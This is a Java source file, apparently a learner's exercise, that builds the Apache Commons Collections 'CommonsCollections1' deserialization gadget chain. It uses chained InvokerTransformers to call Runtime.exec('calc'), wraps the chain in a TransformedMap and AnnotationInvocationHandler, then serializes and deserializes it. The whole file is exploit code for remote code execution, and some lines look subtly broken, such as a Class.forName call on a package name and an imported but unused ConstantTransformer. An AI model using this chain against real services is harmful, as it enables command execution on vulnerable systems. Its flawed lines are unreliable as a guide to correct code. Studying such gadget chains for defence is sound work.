import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;
import java.lang.reflect.Method;

public class CommonCollections1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, IOException {
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getMethod"
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec"
                        , new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        chainedTransformer.transform(Runtime.class);    // 这一句是触发命令执行的关键核心,需要找方法去替代这条语句

        // 分割线
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("key", "value");

        Map<Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        for (Map.Entry entry : decorateMap.entrySet()) {
            entry.setValue(Class.forName("java.lang.reflect").getMethod("getRuntime"));
        }
        Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor constructorAnnotationInvocationHandlerClass  = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
        constructorAnnotationInvocationHandlerClass.setAccessible(true);
        Object o =  constructorAnnotationInvocationHandlerClass.newInstance(Override.class,decorateMap);

        serialize(o);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
